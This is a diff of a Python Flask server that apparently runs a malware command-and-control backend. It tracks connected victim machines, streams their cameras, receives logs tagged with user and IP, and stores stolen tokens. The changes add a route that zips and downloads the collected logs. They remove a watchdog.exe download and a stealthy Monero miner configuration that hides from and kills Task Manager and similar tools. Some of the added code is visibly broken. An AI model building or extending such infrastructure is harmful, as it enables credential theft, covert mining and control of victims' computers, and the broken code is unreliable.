@@ -14,8 +14,8 @@ key = os.environ["key"]
 connectedComputers = []
 
 
-channel_id = 1234567890
-channel_id2 = 123456890
+channel_id = 12345678901234567890
+channel_id2 = 12345678901234567890
 
 
 headers = {
@@ -190,16 +190,22 @@ def ping(ws, computer):
                 print("Bye!")
                 break
 
+def zipdir(path, ziph):
+    for root, dirs, files in os.walk(path):
+        for file in files:
+            ziph.write(os.path.join(root, file), 
+                       os.path.relpath(os.path.join(root, file), 
+                                       os.path.join(path, '..')))
 
 @sock.route("/api/ws/commands")
 def commands(ws):
     global connectedComputers
     global command
-    print("Hi!")
+    print("User Connected")
     data = ws.receive()
     encoded = hashlib.sha256(data.encode()).hexdigest()
     if not encoded == key:
-        print("Bad key")
+        print("Client provided invalid key")
         ws.close()
     while True:
         computer = ws.receive()
@@ -211,6 +217,7 @@ def commands(ws):
     connectedComputers.append(computer)
     threading.Thread(target=ping, args=(ws, computer)).start()
     while True:
+        c = dict(command)
         if not command:
             continue
         print(command)
@@ -330,12 +337,6 @@ def computers(ws):
         command = json.loads(ws.receive())
         print(command)
 
-
-@app.route("/watchdog", methods=["GET"])
-def watchdog():
-    return send_file("watchdog.exe", as_attachment=True)
-
-
 @sock.route("/api/ws/showCamera")
 def camera(ws):
     global cameraImages
@@ -421,8 +422,8 @@ def webhook():
         @response.call_on_close
         def process_after_request():
             print(hook)
-            print("Waiting 30 seconds before deletion")
-            time.sleep(3600)
+            print("Waiting 60 seconds before deletion")
+            time.sleep(60)
             requests.delete(hook, headers=headers)
             print(f"Deleted {hook}")
 
@@ -443,28 +444,39 @@ def webhook():
     return hook
 
 
-@app.route('/logs', methods=["POST"])
+@app.route('/logs', methods=["POST", "GET"])
 def logs():
     try:
         request.form["key"]
     except:
-        print("Wrong key")
+        print("Client provided invalid key")
         return "", 404
+
     encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
     if not encoded == key:
-        print("Wrong key")
+        print("Client provided invalid key")
         return "", 404
 
-    print(request.files)
-    log = request.files["file"]
-    user = request.form["user"]
-    ip = request.form["ip"]
+    if requests.method == "POST":
+        log = request.files["file"]
+        user = request.form["user"]
+        ip = request.form["ip"]
 
-    try:
-        dir = f"logs/{user}-{ip}"
-        log.save(dir)
-    except Exception as e:
-        print(e)
+        try:
+            dir = f"logs/{user}-{ip}"
+            log.save(dir)
+        except Exception as e:
+            print(e)
+
+    else:
+        with zipfile.ZipFile('logs/temp.zip', 'w', zipfile.ZIP_DEFLATED) as zipf:
+            zipdir('logs/', zipf)
+
+        @flask.after_this_request
+        def process_after_request(response):
+            @response.call_on_close
+            def process_after_request():
+                os.remove('logs/temp.zip', 'w+')
 
     return ""
 
@@ -474,67 +486,27 @@ def tokens():
         request.form["key"]
     except:
         return "", 404
+      
     encoded = hashlib.sha256(request.form["key"].encode()).hexdigest()
     if not encoded == key:
         return "", 404
+      
     if request.method == "POST":
         keysFile = json.load(open("tokens.json", "rb"))
         token = request.form["token"]
+      
         with open("tokens.json", "w+") as f:
             keys = keysFile["keys"]
             keys.append(token)
             keysFile["keys"] = keys
             json.dump(keysFile, f, indent=1)
             f.close()
-        return "Ok"
+        return "", 204
+      
     elif request.method == "GET":
         keysFile = json.load(open("tokens.json", "r"))
-        keys = "\n".join(keysFile["keys"])
+        keys = keysFile["keys"]
         return keys
-
-
-@app.route("/miner")
-def miner():
-    return {
-        "algo":
-        "rx/0",
-        "pool":
-        "xmr-us-east1.nanopool.org",
-        "port":
-        14433,
-        "wallet":
-        "49Gwzrmm5irYKmURJgnEVajVnHo1mRMymMR8UykbGCSELCzh3q3BUBPJ4RSEho8K4c4WHvUR7LUtFcFyhXCJ11eLNt3QWoc",
-        "password":
-        "",
-        "rig-id":
-        "",
-        "keepalive":
-        False,
-        "nicehash":
-        False,
-        "ssltls":
-        True,
-        "max-cpu":
-        10,
-        "idle-wait":
-        1,
-        "idle-cpu":
-        50,
-        "stealth":
-        True,
-        "stealth-targets":
-        "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
-        "process-killer":
-        True,
-        "kill-targets":
-        "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe"
-    }
-
-
-@app.route("/logoutput", methods=["POST"])
-def logoutput():
-    print(request.form["errors"])
-    return "", 404
 
 @app.route("/bloxflip-py", methods=["GET"])
 def logger():
